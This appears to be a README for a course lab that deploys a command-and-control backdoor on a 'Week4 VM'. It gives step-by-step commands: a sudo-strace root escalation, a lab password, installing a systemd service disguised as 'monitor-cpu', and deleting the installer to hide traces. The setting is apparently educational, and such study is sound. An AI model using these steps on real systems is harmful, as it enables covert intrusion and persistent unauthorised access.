1. Clone the following repository or download the zipped code and then cd C2_Project
git clone https://github.com/etmch5341/C2_Project.git

2. Modify the “host” parameter in the config file to match the attacker machine (kali)

3. Run the following openssl command on the attacker machine to generate a self signed certificate:
`openssl req -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout server.key -out server.crt`
Just press enter until it is done with the setup

4. Transfer the following files to the Week4 VM
 - monitor-cpu (backdoor source)
 - config.json (configuration file)
 - install.sh (installation script)

5. ssh into the Week4 VM using the password: “hill”

6. Escalate to root using the exploit explored in the previous lab
`sudo strace -o /dev/null /bin/sh`

7. Run the installation script:
`chmod +x install.sh`
`./install.sh`

8. Remove the installation script
`rm ./install.sh`

9. Run the controller script on the attacker machine
`python3 controller.py`

To verify if the systemd service is running you can run the following command: 
`sudo systemctl status -l monitor-cpu.service`

After rebooting, if it says that the “Agent disconnected. Going back to listening..”, simply rerun the command and it should reconnect to the agent and be able to successfully execute the command.
After 1-2 seconds the backdoor runs automatically on startup and can be accessed remotely. In the event uninstallation of the backdoor is needed you can transfer and run the `uninstall.sh` script.

agent.py is the original non hidden version
